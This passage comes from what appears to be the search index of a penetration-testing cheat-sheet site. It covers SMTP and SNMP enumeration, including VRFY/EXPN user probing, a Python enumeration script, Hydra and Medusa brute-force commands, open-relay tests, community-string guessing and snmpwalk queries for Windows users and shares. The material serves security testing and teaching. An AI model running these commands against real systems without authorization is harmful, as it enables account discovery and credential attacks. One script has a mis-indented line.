10240000\n250-VRFY\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250 8BITMIME\n\n  VRFY root\n250 2.1.5 root &lt;root@target.com&gt;\n\nVRFY admin\n550 5.1.1 admin... User unknown\n\nQUIT\n221 2.0.0 Bye\n</code></pre>"},{"location":"mail/smtp/#user-verification-methods","title":"User Verification Methods","text":""},{"location":"mail/smtp/#vrfy-method","title":"VRFY Method","text":"<pre><code># Systematic user enumeration\nusers=(\"root\" \"admin\" \"administrator\" \"user\" \"guest\" \"mail\" \"postmaster\" \"www-data\" \"apache\" \"nginx\")\n\nfor user in \"${users[@]}\"; do\n    echo \"VRFY $user\" | nc target 25 | grep -E \"250|550\"\ndone\n</code></pre>"},{"location":"mail/smtp/#expn-method","title":"EXPN Method","text":"<pre><code># Mailing list expansion\nlists=(\"all\" \"everyone\" \"staff\" \"users\" \"admin\" \"root\")\n\nfor list in \"${lists[@]}\"; do\n    echo \"EXPN $list\" | nc target 25\ndone\n</code></pre>"},{"location":"mail/smtp/#rcpt-to-method_1","title":"RCPT TO Method","text":"<pre><code># Email address validation\ndomains=(\"target.com\" \"localhost\" \"127.0.0.1\")\n\nfor domain in \"${domains[@]}\"; do\n    echo -e \"EHLO test.com\\nMAIL FROM:&lt;test@test.com&gt;\\nRCPT TO:&lt;root@$domain&gt;\" | nc target 25\ndone\n</code></pre>"},{"location":"mail/smtp/#automated-enumeration","title":"Automated Enumeration","text":""},{"location":"mail/smtp/#smtp-user-enum","title":"smtp-user-enum","text":"<pre><code># Install smtp-user-enum\n# apt-get install smtp-user-enum\n\n# VRFY method enumeration\nsmtp-user-enum -M VRFY -U users.txt -t target\n\n# EXPN method enumeration\nsmtp-user-enum -M EXPN -U users.txt -t target\n\n# RCPT method enumeration\nsmtp-user-enum -M RCPT -U users.txt -t target\n\n# Specify custom port\nsmtp-user-enum -M VRFY -U users.txt -t target -p 587\n</code></pre>"},{"location":"mail/smtp/#nmap-nse-scripts","title":"Nmap NSE Scripts","text":"<pre><code># User enumeration script\nnmap -p 25 --script=smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} target\n\n# Open relay detection\nnmap -p 25 --script=smtp-open-relay target\n\n# SMTP commands discovery\nnmap -p 25 --script=smtp-commands target\n\n# NTLM information disclosure\nnmap -p 25,587 --script=smtp-ntlm-info target\n</code></pre>"},{"location":"mail/smtp/#python-automation-script","title":"Python Automation Script","text":"<pre><code>#!/usr/bin/env python3\nimport socket\nimport sys\n\ndef smtp_vrfy(target, port, users):\n    for user in users:\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(5)\n            s.connect((target, port))\n\n            banner = s.recv(1024).decode()\n            print(f\"Banner: {banner.strip()}\")\n\n            s.send(f\"VRFY {user}\\r\\n\".encode())\n            result = s.recv(1024).decode()\n\n            if \"250\" in result:\n                print(f\"[+] User exists: {user}\")\n            elif \"550\" in result:\n                print(f\"[-] User not found: {user}\")\n            else:\n                print(f\"[?] Uncertain: {user} - {result.strip()}\")\n\ns.close()\n        except:\n            print(f\"[!] Error connecting to {target}:{port}\")\n\n# Usage\nusers = [\"root\", \"admin\", \"user\", \"guest\", \"postmaster\"]\nsmtp_vrfy(\"target\", 25, users)\n</code></pre>"},{"location":"mail/smtp/#authentication-testing","title":"Authentication Testing","text":""},{"location":"mail/smtp/#smtp-auth-testing","title":"SMTP AUTH Testing","text":"<pre><code># Check for authentication methods\necho \"EHLO test.com\" | nc target 587\n\n# Look for AUTH methods:\n# 250-AUTH LOGIN PLAIN CRAM-MD5\n\n# Manual authentication testing\necho -e \"EHLO test.com\\nAUTH LOGIN\\n$(echo -n 'username' | base64)\\n$(echo -n 'password' | base64)\" | nc target 587\n</code></pre>"},{"location":"mail/smtp/#brute-force-authentication","title":"Brute Force Authentication","text":"<pre><code># Hydra SMTP brute force\nhydra -L users.txt -P passwords.txt smtp://target:587\n\n# Medusa SMTP brute force\nmedusa -h target -u admin -P passwords.txt -M smtp -n 587\n\n# Custom authentication testing\nfor user in admin user root; do\n    for pass in password admin 123456; do\n        echo \"Testing $user:$pass\"\n        echo -e \"EHLO test.com\\nAUTH LOGIN\\n$(echo -n $user | base64)\\n$(echo -n $pass | base64)\" | nc target 587\n    done\ndone\n</code></pre>"},{"location":"mail/smtp/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"mail/smtp/#ssltls-testing","title":"SSL/TLS Testing","text":"<pre><code># SMTPS (port 465) connection\nopenssl s_client -connect target:465\n\n# STARTTLS (port 587) connection\nopenssl s_client -connect target:587 -starttls smtp\n\n# Cipher enumeration\nnmap --script ssl-enum-ciphers -p 465,587 target\n\n# Certificate analysis\necho | openssl s_client -connect target:465 2&gt;/dev/null | openssl x509 -noout -text\n</code></pre>"},{"location":"mail/smtp/#information-disclosure","title":"Information Disclosure","text":"<pre><code># Extract detailed banner information\necho \"EHLO test.com\" | nc target 25 | grep -E \"220|250\"\n\n# Check for information leakage\necho \"HELP\" | nc target 25\n\n# Test for verbose error messages\necho \"INVALID_COMMAND\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#mail-header-injection-testing","title":"Mail Header Injection Testing","text":"<pre><code># Test for header injection vulnerabilities\necho -e \"EHLO test.com\\nMAIL FROM:&lt;test@test.com&gt;\\nRCPT TO:&lt;user@target.com&gt;\\nDATA\\nSubject: Test\\nCc: admin@target.com\\n\\nTest message\\n.\\nQUIT\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#common-vulnerabilities","title":"Common Vulnerabilities","text":""},{"location":"mail/smtp/#user-enumeration-via-vrfyexpn","title":"User Enumeration via VRFY/EXPN","text":"<pre><code># VULNERABILITY: VRFY command enabled\necho \"VRFY root\" | nc target 25\n# Response: 250 2.1.5 root &lt;root@target.com&gt;\n\n# VULNERABILITY: EXPN command enabled\necho \"EXPN admin\" | nc target 25\n# Response: 250 2.1.5 admin &lt;admin@target.com&gt;\n</code></pre>"},{"location":"mail/smtp/#open-mail-relay","title":"Open Mail Relay","text":"<pre><code># VULNERABILITY: Open relay configuration\necho -e \"EHLO test.com\\nMAIL FROM:&lt;attacker@external.com&gt;\\nRCPT TO:&lt;victim@external.com&gt;\\nDATA\\nRelay test\\n.\\nQUIT\" | nc target 25\n# Response: 250 Message accepted for delivery\n</code></pre>"},{"location":"mail/smtp/#information-disclosure_1","title":"Information Disclosure","text":"<pre><code># VULNERABILITY: Verbose banner information\nnc target 25\n# Response: 220 mail.company.com ESMTP Postfix (Ubuntu) ready\n\n# VULNERABILITY: Software version exposure\necho \"EHLO test.com\" | nc target 25\n# Response: 250-mail.company.com Hello, I am glad to meet you\n</code></pre>"},{"location":"mail/smtp/#weak-authentication","title":"Weak Authentication","text":"<pre><code># VULNERABILITY: Weak or default credentials\necho -e \"EHLO test.com\\nAUTH LOGIN\\n$(echo -n 'admin' | base64)\\n$(echo -n 'admin' | base64)\" | nc target 587\n# Response: 235 2.7.0 Authentication successful\n</code></pre>"},{"location":"mail/smtp/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"mail/smtp/#discovery","title":"Discovery","text":"<pre><code>nmap -p 25,465,587 --script=smtp-enum-users,smtp-commands target\nnc target 25\nsmtp-user-enum -M VRFY -U users.txt -t target\n</code></pre>"},{"location":"mail/smtp/#user-enumeration","title":"User Enumeration","text":"<pre><code>echo \"VRFY root\" | nc target 25\necho \"EXPN admin\" | nc target 25\necho -e \"EHLO test\\nMAIL FROM:&lt;test@test.com&gt;\\nRCPT TO:&lt;user@target.com&gt;\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#open-relay-testing","title":"Open Relay Testing","text":"<pre><code>echo -e \"EHLO test.com\\nMAIL FROM:&lt;ext@test.com&gt;\\nRCPT TO:&lt;ext2@test.com&gt;\\nDATA\\nRelay test\\n.\\nQUIT\" | nc target 25\n</code></pre>"},{"location":"mail/smtp/#ssltls-testing_1","title":"SSL/TLS Testing","text":"<pre><code>openssl s_client -connect target:465\nopenssl s_client -connect target:587 -starttls smtp\nnmap --script ssl-enum-ciphers -p 465,587 target\n</code></pre>"},{"location":"mail/smtp/#testing-checklist","title":"Testing Checklist","text":""},{"location":"mail/smtp/#discovery-detection","title":"Discovery &amp; Detection","text":"<ul> <li> Port 25/465/587 open and responding</li> <li> SMTP service banner analysis</li> <li> Supported command enumeration</li> <li> SSL/TLS configuration assessment</li> </ul>"},{"location":"mail/smtp/#user-enumeration_1","title":"User Enumeration","text":"<ul> <li> VRFY command availability and testing</li> <li> EXPN command functionality</li> <li> RCPT TO method user validation</li> <li> Automated user enumeration</li> </ul>"},{"location":"mail/smtp/#configuration-testing","title":"Configuration Testing","text":"<ul> <li> Open relay detection</li> <li> Authentication method identification</li> <li> STARTTLS support verification</li> <li> Mail routing analysis</li> </ul>"},{"location":"mail/smtp/#security-assessment","title":"Security Assessment","text":"<ul> <li> Banner information disclosure</li> <li> User enumeration vulnerabilities</li> <li> Authentication mechanism strength</li> <li> SSL/TLS cipher analysis</li> </ul>"},{"location":"mail/smtp/#authentication-testing_1","title":"Authentication Testing","text":"<ul> <li> Default credential testing</li> <li> SMTP AUTH brute force</li> <li> Weak password identification</li> <li> Account lockout testing</li> </ul>"},{"location":"mail/smtp/#critical-security-issues","title":"Critical Security Issues","text":""},{"location":"mail/smtp/#user-enumeration-vulnerability","title":"User Enumeration Vulnerability","text":"<ul> <li>Impact: User account discovery, reconnaissance data</li> <li>Detection: Successful VRFY/EXPN commands</li> <li>Exploitation: <code>echo \"VRFY root\" | nc target 25</code></li> </ul>"},{"location":"mail/smtp/#open-mail-relay_1","title":"Open Mail Relay","text":"<ul> <li>Impact: Mail abuse, reputation damage, blacklisting</li> <li>Detection: Successful external-to-external mail relay</li> <li>Exploitation: Spam distribution, phishing campaigns</li> </ul>"},{"location":"mail/smtp/#information-disclosure_2","title":"Information Disclosure","text":"<ul> <li>Impact: Software fingerprinting, version identification</li> <li>Detection: Verbose banners, detailed error messages</li> <li>Exploitation: Version-specific attack identification</li> </ul>"},{"location":"mail/smtp/#weak-authentication_1","title":"Weak Authentication","text":"<ul> <li>Impact: Unauthorized mail access, account compromise</li> <li>Detection: Successful authentication with weak credentials</li> <li>Exploitation: Mail access, credential harvesting</li> </ul>"},{"location":"mail/smtp/#ssltls-weaknesses","title":"SSL/TLS Weaknesses","text":"<ul> <li>Impact: Man-in-the-middle attacks, credential interception</li> <li>Detection: Weak ciphers, outdated TLS versions</li> <li>Exploitation: Traffic interception, credential theft</li> </ul>"},{"location":"mail/smtp/#common-smtp-response-codes","title":"Common SMTP Response Codes","text":""},{"location":"mail/smtp/#success-codes","title":"Success Codes","text":"<pre><code>220 - Service ready\n250 - Requested action completed\n251 - User not local; will forward\n252 - Cannot verify user; will attempt delivery\n354 - Start mail input\n</code></pre>"},{"location":"mail/smtp/#error-codes","title":"Error Codes","text":"<pre><code>421 - Service not available\n450 - Mailbox unavailable (temporary)\n550 - Mailbox unavailable (permanent)\n551 - User not local\n552 - Exceeded storage allocation\n553 - Mailbox name not allowed\n554 - Transaction failed\n</code></pre>"},{"location":"mail/smtp/#user-enumeration-wordlists","title":"User Enumeration Wordlists","text":""},{"location":"mail/smtp/#common-usernames","title":"Common Usernames","text":"<pre><code>root\nadmin\nadministrator\nuser\nguest\npostmaster\nwebmaster\nmail\nnobody\nwww-data\napache\nnginx\nftp\nssh\ntest\ndemo\nservice\n</code></pre>"},{"location":"mail/smtp/#email-address-formats","title":"Email Address Formats","text":"<pre><code>username@domain.com\nusername@localhost\nusername@target\nadmin@target.com\nroot@target.com\npostmaster@target.com\nwebmaster@target.com\ninfo@target.com\nsupport@target.com\n</code></pre>"},{"location":"mail/smtp/#advanced-mail-server-testing","title":"Advanced Mail Server Testing","text":""},{"location":"mail/smtp/#mail-server-fingerprinting","title":"Mail Server Fingerprinting","text":"<pre><code># Identify mail server software\necho \"EHLO test.com\" | nc target 25 | grep -i \"postfix\\|sendmail\\|exchange\\|exim\"\n\n# Version detection\nnmap -p 25 -sV --script=smtp-vuln-* target\n</code></pre>"},{"location":"mail/smtp/#mail-routing-analysis","title":"Mail Routing Analysis","text":"<pre><code># Trace mail routing\necho -e \"EHLO test.com\\nMAIL FROM:&lt;test@test.com&gt;\\nRCPT TO:&lt;user@target.com&gt;\\nDATA\\nReceived: trace\\n.\\nQUIT\" | nc target 25\n\n# Multiple domain testing\nfor domain in target.com localhost 127.0.0.1; do\n    echo \"RCPT TO:&lt;test@$domain&gt;\" | nc target 25\ndone\n</code></pre>"},{"location":"network/","title":"Network Services","text":"<p>Network services provide core infrastructure functionality and often expose valuable system information for reconnaissance and exploitation.</p>"},{"location":"network/#overview","title":"Overview","text":"<p>Network service enumeration focuses on:</p> <ul> <li>System and device identification</li> <li>Configuration disclosure</li> <li>Management interface access</li> <li>Information leakage</li> <li>Administrative access vectors</li> </ul>"},{"location":"network/#common-network-services","title":"Common Network Services","text":""},{"location":"network/#snmp-ports-161-162","title":"SNMP (Ports 161, 162)","text":"<p>Simple Network Management Protocol provides network device monitoring and management capabilities.</p> <p>Key Attack Vectors: - Community string enumeration - MIB walking for information disclosure - Write access for configuration changes - Version-specific vulnerabilities</p> <p>View SNMP Cheat Sheet</p>"},{"location":"network/#general-methodology","title":"General Methodology","text":""},{"location":"network/#1-discovery","title":"1. Discovery","text":"<pre><code># Port scanning\nnmap -sU -p 161,162 target\n\n# Service detection\nnmap -sU -sV -p 161,162 target\n</code></pre>"},{"location":"network/#2-enumeration","title":"2. Enumeration","text":"<pre><code># Community string testing\nonesixtyone -c community.txt target\n\n# MIB walking\nsnmpwalk -c public -v1 target\n</code></pre>"},{"location":"network/#3-information-gathering","title":"3. Information Gathering","text":"<pre><code># System information\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1\n\n# Network interfaces\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.2.2.1\n</code></pre>"},{"location":"network/#4-exploitation","title":"4. Exploitation","text":"<ul> <li>Leverage exposed information</li> <li>Attempt configuration changes</li> <li>Extract sensitive data</li> <li>Map network infrastructure</li> </ul>"},{"location":"network/#security-considerations","title":"Security Considerations","text":"<p>When testing network services:</p> <ul> <li>Network impact - Be cautious with network-wide services</li> <li>Device stability - Avoid overwhelming network devices</li> <li>Information sensitivity - Network topology data can be sensitive</li> <li>Monitoring detection - Network services are often monitored</li> </ul>"},{"location":"network/#common-information-exposed","title":"Common Information Exposed","text":""},{"location":"network/#snmp-data","title":"SNMP Data","text":"<ul> <li>System information and versions</li> <li>Network interface configurations</li> <li>Routing table information</li> <li>Running processes and services</li> <li>Installed software</li> <li>User accounts</li> <li>Network shares and mounted filesystems</li> </ul>"},{"location":"network/#exploitation-techniques","title":"Exploitation Techniques","text":""},{"location":"network/#read-access","title":"Read Access","text":"<ul> <li>System reconnaissance</li> <li>Network mapping</li> <li>Service identification</li> <li>Vulnerability assessment</li> </ul>"},{"location":"network/#write-access","title":"Write Access","text":"<ul> <li>Configuration modification</li> <li>Service manipulation</li> <li>Access control bypass</li> <li>Denial of service</li> </ul>"},{"location":"network/#tools-and-resources","title":"Tools and Resources","text":""},{"location":"network/#essential-tools","title":"Essential Tools","text":"<ul> <li>nmap - Service discovery and scripting</li> <li>onesixtyone - SNMP community string enumeration</li> <li>snmpwalk - MIB tree walking</li> <li>snmp-check - Comprehensive SNMP enumeration</li> </ul>"},{"location":"network/#specialized-tools","title":"Specialized Tools","text":"<ul> <li>snmpget - Specific OID retrieval</li> <li>snmpset - SNMP value modification</li> <li>snmptranslate - OID translation</li> <li>snmpdf - Disk space enumeration</li> </ul> <p>Select a specific network service above to access detailed enumeration and exploitation techniques.</p>"},{"location":"network/snmp/","title":"SNMP Enumeration Cheat Sheet","text":""},{"location":"network/snmp/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Overview</li> <li>Ports &amp; Protocols</li> <li>Quick Discovery</li> <li>Essential Enumeration Workflow</li> <li>SNMP Versions &amp; Security</li> <li>Windows-Specific Enumeration</li> <li>Common OID Reference</li> <li>Automated Tools</li> <li>Quick Reference Commands</li> <li>Testing Checklist</li> <li>Critical Security Issues</li> </ol>"},{"location":"network/snmp/#overview","title":"Overview","text":"<p>SNMP (Simple Network Management Protocol) is a network protocol for monitoring and managing network devices including routers, switches, servers, and IoT devices. It operates over UDP and provides extensive system information through a hierarchical database structure.</p>"},{"location":"network/snmp/#why-snmp-matters-in-pentesting","title":"Why SNMP Matters in Pentesting","text":"<ul> <li>Information Disclosure: Reveals extensive system information</li> <li>Weak Authentication: Often uses default community strings  </li> <li>Network Mapping: Exposes network topology and devices</li> <li>Credential Harvesting: May contain usernames and system details</li> <li>Legacy Security: Older versions lack proper encryption</li> </ul>"},{"location":"network/snmp/#common-attack-vectors","title":"Common Attack Vectors","text":"<ul> <li>Default Community Strings: \"public\" and \"private\" often unchanged</li> <li>Community String Brute Force: Weak authentication mechanisms</li> <li>Information Enumeration: System users, processes, network configuration</li> <li>Write Access Exploitation: Device reconfiguration capabilities</li> </ul>"},{"location":"network/snmp/#ports-protocols","title":"Ports &amp; Protocols","text":"<pre><code>161/udp - SNMP (Simple Network Management Protocol)\n162/udp - SNMP Trap (asynchronous notifications)\n</code></pre>"},{"location":"network/snmp/#snmp-versions","title":"SNMP Versions","text":"Version Authentication Encryption Security Level SNMPv1 Community strings None Very Low SNMPv2c Community strings None Very Low SNMPv3 Username/Password AES/3DES High"},{"location":"network/snmp/#quick-discovery","title":"Quick Discovery","text":"<pre><code># UDP port scan for SNMP\nnmap -sU --open -p 161 target\n\n# SNMP service detection\nnmap -sU -p 161 --script=snmp-info target\n\n# Comprehensive SNMP discovery\nnmap -sU -p 161 --script=snmp-* target\n</code></pre>"},{"location":"network/snmp/#essential-enumeration-workflow","title":"Essential Enumeration Workflow","text":""},{"location":"network/snmp/#community-string-discovery","title":"Community String Discovery","text":"<pre><code># Test common default strings\nsnmpwalk -c public -v1 target\nsnmpwalk -c private -v1 target\nsnmpwalk -c community -v1 target\n\n# Brute force community strings\nonesixtyone -c community.txt target\nonesixtyone -i targets.txt -c community.txt\n\n# Create community wordlist\necho -e \"public\\nprivate\\ncommunity\\nmanager\\nadmin\\ndefault\\nsnmp\\nmonitor\" &gt; community.txt\n\n# Nmap brute force\nnmap -sU -p 161 --script=snmp-brute target\n</code></pre>"},{"location":"network/snmp/#complete-mib-enumeration","title":"Complete MIB Enumeration","text":"<pre><code># Walk entire MIB tree\nsnmpwalk -c public -v1 target\n\n# Walk specific branches\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1    # System info\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25   # Host resources\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77    # Windows-specific\n\n# Bulk operations (SNMPv2c)\nsnmpbulkwalk -c public -v2c target\n\n# BRAA for fast enumeration\nbraa public@target:.1.3.6.*\n</code></pre>"},{"location":"network/snmp/#system-information-gathering","title":"System Information Gathering","text":"<pre><code># System description\nsnmpget -c public -v1 target 1.3.6.1.2.1.1.1.0\n\n# System uptime\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1.3.0\n\n# Hostname\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1.5\n\n# System contact\nsnmpget -c public -v1 target 1.3.6.1.2.1.1.4.0\n</code></pre>"},{"location":"network/snmp/#snmp-versions-security","title":"SNMP Versions &amp; Security","text":""},{"location":"network/snmp/#snmpv1v2c-insecure","title":"SNMPv1/v2c (Insecure)","text":"<pre><code># SNMPv1 enumeration\nsnmpwalk -v1 -c public target\n\n# SNMPv2c enumeration  \nsnmpwalk -v2c -c public target\n\n# VULNERABILITY: Plaintext community strings, no encryption\n</code></pre>"},{"location":"network/snmp/#snmpv3-secure","title":"SNMPv3 (Secure)","text":"<pre><code># SNMPv3 with authentication\nsnmpwalk -v3 -u username -A password -l authNoPriv target\n\n# SNMPv3 with authentication and encryption\nsnmpwalk -v3 -u username -A authpass -X privpass -l authPriv target\n</code></pre>"},{"location":"network/snmp/#write-access-testing","title":"Write Access Testing","text":"<pre><code># Test with private community string\nsnmpset -c private -v1 target 1.3.6.1.2.1.1.4.0 s \"Test Contact\"\n\n# Verify write access\nsnmpget -c private -v1 target 1.3.6.1.2.1.1.4.0\n</code></pre>"},{"location":"network/snmp/#windows-specific-enumeration","title":"Windows-Specific Enumeration","text":""},{"location":"network/snmp/#user-account-information","title":"User Account Information","text":"<pre><code># Windows user accounts\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.25\n\n# Enumerate specific users\nfor i in {1..20}; do \n    snmpget -c public -v1 target 1.3.6.1.4.1.77.1.2.25.1.1.$i\ndone\n</code></pre>"},{"location":"network/snmp/#process-and-service-information","title":"Process and Service Information","text":"<pre><code># Running programs/processes\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.4.2.1.2\n\n# Process paths\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.4.2.1.4\n\n# Windows services via Nmap\nnmap -sU -p 161 --script=snmp-win32-services target\n</code></pre>"},{"location":"network/snmp/#network-and-share-information","title":"Network and Share Information","text":"<pre><code># Windows hostname\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1.5\n\n# Windows share information (method 1)\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.3.1.1\n\n# Windows share information (method 2)\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.27\n\n# Windows shares via Nmap\nnmap -sU -p 161 --script=snmp-win32-shares target\n\n# TCP listening ports\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.6.13.1.3\n</code></pre>"},{"location":"network/snmp/#software-information","title":"Software Information","text":"<pre><code># Installed software names\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.6.3.1.2\n\n# Software installation paths\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.6.3.1.4\n\n# System processes count\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.1.6.0\n</code></pre>"},{"location":"network/snmp/#network-configuration","title":"Network Configuration","text":"<pre><code># Network interfaces\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.2.2.1.2\n\n# IP addresses\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.4.20.1.1\n\n# TCP connections\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.6.13.1.3\n\n# Network statistics via Nmap\nnmap -sU -p 161 --script=snmp-netstat target\n</code></pre>"},{"location":"network/snmp/#common-oid-reference","title":"Common OID Reference","text":""},{"location":"network/snmp/#system-information-oids","title":"System Information OIDs","text":"<pre><code>1.3.6.1.2.1.1.1.0    - System Description\n1.3.6.1.2.1.1.3.0    - System Uptime\n1.3.6.1.2.1.1.4.0    - System Contact\n1.3.6.1.2.1.1.5.0    - System Name/Hostname\n1.3.6.1.2.1.1.6.0    - System Location\n</code></pre>"},{"location":"network/snmp/#windows-specific-oids","title":"Windows-Specific OIDs","text":"<pre><code>1.3.6.1.4.1.77.1.2.25     - Windows User Accounts\n1.3.6.1.2.1.25.4.2.1.2    - Running Programs/Processes\n1.3.6.1.2.1.25.4.2.1.4    - Process Paths\n1.3.6.1.4.1.77.1.2.3.1.1  - Windows Share Information\n1.3.6.1.4.1.77.1.2.27     - Windows Share Information (alt)\n1.3.6.1.2.1.6.13.1.3      - TCP Local Ports\n1.3.6.1.2.1.25.6.3.1.2    - Software Names\n1.3.6.1.2.1.25.1.6.0      - System Processes Count\n</code></pre>"},{"location":"network/snmp/#network-information-oids","title":"Network Information OIDs","text":"<pre><code>1.3.6.1.2.1.2.2.1.2       - Network Interfaces\n1.3.6.1.2.1.4.20.1.1      - IP Addresses\n1.3.6.1.2.1.4.21.1.1      - Routing Table\n1.3.6.1.2.1.4.22.1.2      - ARP Table\n1.3.6.1.2.1.7.5.1.2       - UDP Listeners\n</code></pre>"},{"location":"network/snmp/#automated-tools","title":"Automated Tools","text":""},{"location":"network/snmp/#snmp-check","title":"snmp-check","text":"<pre><code># Comprehensive SNMP enumeration\nsnmp-check target\nsnmp-check target -c public\nsnmp-check target -c private\n\n# Specify custom community string\nsnmp-check target -c custom_community\n</code></pre>"},{"location":"network/snmp/#nmap-nse-scripts","title":"Nmap NSE Scripts","text":"<pre><code># System description\nnmap -sU -p 161 --script=snmp-sysdescr target\n\n# Process enumeration\nnmap -sU -p 161 --script=snmp-processes target\n\n# Network interface information\nnmap -sU -p 161 --script=snmp-interfaces target\n\n# SNMP brute force\nnmap -sU -p 161 --script=snmp-brute target\n\n# Windows-specific scripts\nnmap -sU -p 161 --script=snmp-win32-services target\nnmap -sU -p 161 --script=snmp-win32-shares target\n</code></pre>"},{"location":"network/snmp/#mass-snmp-scanning","title":"Mass SNMP Scanning","text":"<pre><code># Scan multiple targets\nonesixtyone -i targets.txt -c community.txt\n\n# Nmap across ranges\nnmap -sU -p 161 --script=snmp-info 192.168.1.0/24\n\n# Save results for analysis\nonesixtyone -i targets.txt -c community.txt -o snmp_results.txt\n</code></pre>"},{"location":"network/snmp/#quick-reference-commands","title":"Quick Reference Commands","text":""},{"location":"network/snmp/#discovery","title":"Discovery","text":"<pre><code>nmap -sU -p 161 --script=snmp-info target\nonesixtyone -c community.txt target\nsnmp-check target\n</code></pre>"},{"location":"network/snmp/#basic-enumeration","title":"Basic Enumeration","text":"<pre><code>snmpwalk -c public -v1 target\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.1\nsnmpget -c public -v1 target 1.3.6.1.2.1.1.1.0\n</code></pre>"},{"location":"network/snmp/#windows-specific","title":"Windows-Specific","text":"<pre><code>snmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.25    # Users\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.25.4.2.1.2   # Processes\nsnmpwalk -c public -v1 target 1.3.6.1.4.1.77.1.2.27    # Shares\n</code></pre>"},{"location":"network/snmp/#network-information","title":"Network Information","text":"<pre><code>snmpwalk -c public -v1 target 1.3.6.1.2.1.4.20.1.1     # IP addresses\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.6.13.1.3     # TCP ports\nsnmpwalk -c public -v1 target 1.3.6.1.2.1.2.2.1.2      # Interfaces\n</code></pre>"},{"location":"network/snmp/#testing-checklist","title":"Testing Checklist","text":""},{"location":"network/snmp/#discovery-detection","title":"Discovery &amp; Detection","text":"<ul> <li> UDP port 161 open and responding</li> <li> SNMP version identification</li> <li> Community string enumeration</li> <li> SNMPv3 user discovery (if applicable)</li> </ul>"},{"location":"network/snmp/#authentication-testing","title":"Authentication Testing","text":"<ul> <li> Default community string testing</li> <li> Community string brute force</li> <li> SNMPv3 authentication testing</li> <li> Write access verification</li> </ul>"},{"location":"network/snmp/#information-enumeration","title":"Information Enumeration","text":"<ul> <li> System information gathering</li> <li> User account enumeration</li> <li> Process and service discovery</li> <li> Network configuration extraction</li> <li> Installed software identification</li> </ul>"},{"location":"network/snmp/#windows-specific-testing","title":"Windows-Specific Testing","text":"<ul> <li> User account enumeration</li> <li> Share information gathering</li> <li> Running process identification</li> <li> Service enumeration</li> </ul>"},{"location":"network/snmp/#security-assessment","title":"Security Assessment","text":"<ul> <li> Community string strength</li> <li> SNMP version security</li> <li> Information disclosure assessment</li> <li> Write access implications</li> </ul>"},{"location":"network/snmp/#critical-security-issues","title":"Critical Security Issues","text":""},{"location":"network/snmp/#default-community-strings","title":"Default Community Strings","text":"<ul> <li>Impact: Complete system information disclosure</li> <li>Detection: Successful authentication with \"public\"/\"private\"</li> <li>Exploitation: <code>snmpwalk -c public -v1 target</code></li> </ul>"},{"location":"network/snmp/#information-disclosure","title":"Information Disclosure","text":"<ul> <li>Impact: Reconnaissance data, user enumeration, network mapping</li> <li>Detection: Successful SNMP queries returning sensitive data</li> <li>Exploitation: User account discovery, process enumeration</li> </ul>"},{"location":"network/snmp/#write-access-vulnerability","title":"Write Access Vulnerability","text":"<ul> <li>Impact: Device reconfiguration, service disruption</li> <li>Detection: Successful SNMP SET operations</li> <li>Exploitation: <code>snmpset -c private -v1 target 1.3.6.1.2.1.1.4.0 s \"Test\"</code></li> </ul>"},{"location":"network/snmp/#snmpv1v2c-usage","title":"SNMPv1/v2c Usage","text":"<ul> <li>Impact: Credential interception, man-in-the-middle attacks</li> <li>Detection: SNMP version identification</li> <li>Exploitation: Network traffic analysis, credential harvesting</li> </ul>"},{"location":"network/snmp/#weak-community-strings","title":"Weak Community Strings","text":"<ul> <li>Impact: Unauthorized access, information disclosure</li> <li>Detection: Successful brute force attacks</li> <li>Exploitation: Complete SNMP access with guessable credentials</li> </ul>"},{"location":"network/snmp/#community-string-wordlists","title":"Community String Wordlists","text":""},{"location":"network/snmp/#common-default-strings","title":"Common Default Strings","text":"<pre><code>public\nprivate\ncommunity\nmanager\nadmin\ndefault\nsnmp\nmonitor\nguest\ncisco\nread\nwrite\ntest\nsecurity\nnetwork\n</code></pre>"},{"location":"network/snmp/#wordlist-locations","title":"Wordlist Locations","text":"<ul> <li>SecLists: <code>/SecLists/Discovery/SNMP/snmp_default_pass.txt</code></li> <li>SecLists: <code>/SecLists/Discovery/SNMP/snmp_default_community_strings.txt</code></li> <li>Custom list: Create based on target environment</li> </ul>"},{"location":"network/snmp/#advanced-techniques","title":"Advanced Techniques","text":""},{"location":"network/snmp/#custom-oid-queries","title":"Custom OID Queries","text":"<pre><code># Query specific OIDs\nsnmpget -c public -v1 target 1.3.6.1.2.1.1.1.0    # sysDescr\nsnmpget -c public -v1 target 1.3.6.1.2.1.1.5.0    # sysName\n\n# Walk OID ranges\nfor oid in $(seq 1 100); do\n    snmpget -c public -v1 target 1.3.6.1.2.1.1.$oid.0 2&gt;/dev/null\ndone\n</code></pre>"},{"location":"network/snmp/#snmp-write-operations","title":"SNMP Write Operations","text":"<pre><code># Modify system contact (if write access 